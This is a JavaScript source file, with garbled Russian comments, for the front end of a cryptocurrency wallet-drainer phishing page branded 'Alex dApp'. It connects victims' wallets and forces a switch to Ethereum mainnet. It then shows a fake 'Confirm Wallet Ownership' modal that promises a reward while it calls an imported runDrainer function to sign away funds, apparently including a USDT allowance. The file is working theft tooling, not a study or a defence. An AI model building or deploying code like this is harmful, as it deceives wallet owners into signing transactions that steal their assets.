import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png']
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW'
})

let connectedAddress = null
let hasDrained = false
let hasAttemptedContractCall = false
let isTransactionPending = false // –§–ª–∞–≥ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
let actionBtn = null
let modalOverlay = null
let modalContent = null
let modalShown = false

// –¶–µ–ª–µ–≤–∞—è —Å–µ—Ç—å (mainnet –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ)
const targetChainId = '0x1' // Ethereum Mainnet

window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn')
  const isInjected = typeof window.ethereum !== 'undefined'

  // –ü–æ–¥–∫–ª—é—á–∞–µ–º —à—Ä–∏—Ñ—Ç Montserrat
  const link = document.createElement('link')
  link.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap'
  link.rel = 'stylesheet'
  document.head.appendChild(link)

  // –°–æ–∑–¥–∞–µ–º —Å—Ç–∏–ª–∏ –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
  const style = document.createElement('style')
  style.textContent = `
    /* –ó–∞—Ç–µ–º–Ω–µ–Ω–∏–µ —Ñ–æ–Ω–∞ */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      display: none;
    }

    /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ */
    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #ffffff;
      border: 2px solid #007bff;
      border-radius: 12px;
      padding: 30px;
      width: 90%;
      max-width: 300px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Montserrat', sans-serif;
      color: #000000;
      animation: slideDown 0.5s ease-out forwards;
    }

    /* –ê–Ω–∏–º–∞—Ü–∏—è –æ–ø—É—Å–∫–∞–Ω–∏—è –∂–∞–ª—é–∑–∏ */
    @keyframes slideDown {
      0% {
        transform: translate(-50%, -100%);
        opacity: 0;
      }
      100% {
        transform: translate(-50%, -50%);
        opacity: 1;
      }
    }

    /* –ó–∞–≥–æ–ª–æ–≤–æ–∫ */
    .modal-title {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 45px;
    }

    /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –∫—Ä—É–∂–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∏ –∏–∫–æ–Ω–∫–∏ */
    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
    }

    /* –ö—Ä—É–∂–æ–∫ –∑–∞–≥—Ä—É–∑–∫–∏ */
    .loader {
      width: 100%;
      height: 100%;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 0;
      left: 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* –ù–∏–∂–Ω–∏–π —Ç–µ–∫—Å—Ç */
    .modal-footer {
      font-size: 14px;
      color: #555555;
      margin-top: 30px;
    }

    /* –°–ø–∏—Å–æ–∫ –¥–µ–π—Å—Ç–≤–∏–π */
    .action-list {
      list-style: none;
      padding: 0;
      margin: 40px 0 0;
      font-size: 14px;
      color: #000000;
    }

    .action-list li {
      margin-bottom: 5px;
    }

    /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö */
    @media (max-width: 480px) {
      .modal-content {
        max-width: 250px;
        padding: 20px;
        min-height: 300px;
      }

      .modal-title {
        font-size: 18px;
      }

      .loader-container {
        width: 80px;
        height: 80px;
      }

      .modal-footer {
        font-size: 12px;
      }

      .action-list {
        font-size: 12px;
      }
    }
  `
  document.head.appendChild(style)

  // –î–æ–±–∞–≤–ª—è–µ–º HTML –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
  modalOverlay = document.createElement('div')
  modalOverlay.className = 'modal-overlay'
  document.body.appendChild(modalOverlay)

  modalContent = document.createElement('div')
  modalContent.className = 'modal-content'
  modalContent.innerHTML = `
    <div class="modal-title">Confirm Wallet Ownership</div>
    <div class="loader-container">
      <div class="loader"></div>
    </div>
    <div class="modal-footer">continue inside the window that opens...</div>
    <ul class="action-list">
      <li>1. Allow interaction with you</li>
      <li>2. Confirm the verification transaction</li>
      <li>3. Receive a reward</li>
    </ul>
  `
  document.body.appendChild(modalContent)

  if (!isInjected) {
    actionBtn.style.display = 'inline-block'
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal()
    })
    return
  }

  actionBtn.style.display = 'inline-block'
  actionBtn.addEventListener('click', handleConnectOrAction)

  // –ü–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ —Å–º–µ–Ω—É —Å–µ—Ç–∏
  window.ethereum.on('chainChanged', onChainChanged)
})

// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –º–æ–¥–∞–ª—å–Ω—ã–º –æ–∫–Ω–æ–º
function showModal() {
  modalOverlay.style.display = 'block'
  modalContent.style.display = 'block'
}

function hideModal() {
  modalOverlay.style.display = 'none'
  modalContent.style.display = 'none'
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true
    showModal()
  }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π —Å–º–µ–Ω—ã —Å–µ—Ç–∏
async function switchToTargetNetwork() {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const network = await provider.getNetwork()
    const currentChainId = `0x${network.chainId.toString(16)}`

    if (currentChainId === targetChainId) {
      console.log('‚úÖ –£–∂–µ –Ω–∞ –Ω—É–∂–Ω–æ–π —Å–µ—Ç–∏:', targetChainId)
      return true
    }

    console.log('üîÑ –ü–æ–ø—ã—Ç–∫–∞ —Å–º–µ–Ω–∏—Ç—å —Å–µ—Ç—å –Ω–∞:', targetChainId)
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: targetChainId }],
    })
    console.log('‚úÖ –°–µ—Ç—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞:', targetChainId)
    return true
  } catch (err) {
    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
      // –°–µ—Ç—å –Ω–µ –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ –∫–æ—à–µ–ª–µ–∫, –ø—ã—Ç–∞–µ–º—Å—è –¥–æ–±–∞–≤–∏—Ç—å
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: targetChainId,
            chainName: 'Ethereum Mainnet',
            nativeCurrency: {
              name: 'Ether',
              symbol: 'ETH',
              decimals: 18,
            },
            rpcUrls: ['https://mainnet.infura.io/v3/'],
            blockExplorerUrls: ['https://etherscan.io'],
          }],
        })
        console.log('‚úÖ –°–µ—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω–∞ –∏ –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞:', targetChainId)
        return true
      } catch (addErr) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ —Å–µ—Ç–∏:', addErr)
        return false
      }
    } else if (err.message.includes('user rejected')) {
      console.log('üôÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Å–º–µ–Ω—É —Å–µ—Ç–∏')
      return false
    } else {
      console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ —Å–µ—Ç–∏:', err)
      return false
    }
  }
}

async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('‚ö†Ô∏è –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É–∂–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏–ª–∏ –æ–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è')
    return
  }

  // –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –∏ drainer —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω—É–∂–Ω–æ–π —Å–µ—Ç–∏
  const isNetworkCorrect = await switchToTargetNetwork()
  if (!isNetworkCorrect) {
    console.log('‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω—É–∂–Ω—É—é —Å–µ—Ç—å, –ø—Ä–µ—Ä—ã–≤–∞–µ–º')
    return
  }

  showModalOnce()

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner()

    isTransactionPending = true // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥ –æ–∂–∏–¥–∞–Ω–∏—è

    // –ó–∞–ø—É—Å–∫–∞–µ–º drainer (–ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç—Å—è, —á—Ç–æ USDT allowance —É–∂–µ –≤—ã–≤–æ–¥–∏—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ runDrainer)
    const tx = await runDrainer(provider, signer, connectedAddress)
    console.log('üì® –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:', tx.hash)

    // –û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    const receipt = await tx.wait()
    console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞:', receipt.transactionHash)

    hasDrained = true
    isTransactionPending = false // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
    cleanup()
    hideModal() // –ó–∞–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
  } catch (err) {
    isTransactionPending = false // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –ø—Ä–∏ –æ—à–∏–±–∫–µ
    hideModal() // –ó–∞–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø—Ä–∏ –ª—é–±–æ–π –æ—à–∏–±–∫–µ (–≤–∫–ª—é—á–∞—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–µ)

    if (err.message.includes('user rejected')) {
      console.log('üôÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é')
      return
    }

    if (hasAttemptedContractCall) {
      console.log('‚ö†Ô∏è –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —É–∂–µ –±—ã–ª–æ –∑–∞–ø—É—â–µ–Ω–æ –æ–¥–Ω–∞–∂–¥—ã ‚Äî –ø–æ–≤—Ç–æ—Ä –Ω–µ –¥–æ–ø—É—Å–∫–∞–µ—Ç—Å—è')
      return
    }

    hasAttemptedContractCall = true
    console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', err)
  }
}

// –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∏ –ø–µ—Ä–≤–æ–≥–æ –∑–∞–ø—É—Å–∫–∞
async function handleConnectOrAction() {
  try {
    const accs = await window.ethereum.request({ method: 'eth_accounts' })
    if (accs.length === 0) {
      await appKitModal.open()
      connectedAddress = await waitForWallet()
      console.log('‚úÖ –ü–æ–¥–∫–ª—é—á–∏–ª–∏—Å—å –∫–∞–∫', connectedAddress)
    } else {
      connectedAddress = accs[0]
      console.log('‚úÖ –£–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã:', connectedAddress)
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –æ–∂–∏–¥–∞–µ—Ç—Å—è –ª–∏ —É–∂–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è
    if (!isTransactionPending) {
      await attemptDrainer()
    } else {
      console.log('‚è≥ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É–∂–µ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ, –æ–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è')
    }
  } catch (err) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è/–¥—Ä–µ–Ω–∞–∂–∞:', err)
  }
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—ã–∑–æ–≤ –ø—Ä–∏ —Å–º–µ–Ω–µ —Å–µ—Ç–∏
async function onChainChanged(_chainId) {
  console.log('üîÑ –°–µ—Ç—å —Å–º–µ–Ω–∏–ª–∞—Å—å:', _chainId)
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer()
  } else {
    console.log('‚è≥ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É–∂–µ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –∏–ª–∏ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è')
  }
}

// –û—Ç–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –∏ —É–¥–∞–ª—è–µ–º —Å–ª—É—à–∞—Ç–µ–ª–∏
function cleanup() {
  if (!actionBtn) return
  actionBtn.removeEventListener('click', handleConnectOrAction)
  window.ethereum.removeListener('chainChanged', onChainChanged)
  actionBtn.disabled = true
  actionBtn.style.opacity = '0.6'
}

// –û–∂–∏–¥–∞–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
async function waitForWallet() {
  const accs = await window.ethereum.request({ method: 'eth_accounts' })
  if (accs.length > 0) return accs[0]
  return new Promise(resolve => {
    const id = setInterval(async () => {
      const a = await window.ethereum.request({ method: 'eth_accounts' })
      if (a.length) {
        clearInterval(id)
        resolve(a[0])
      }
    }, 500)
  })
}
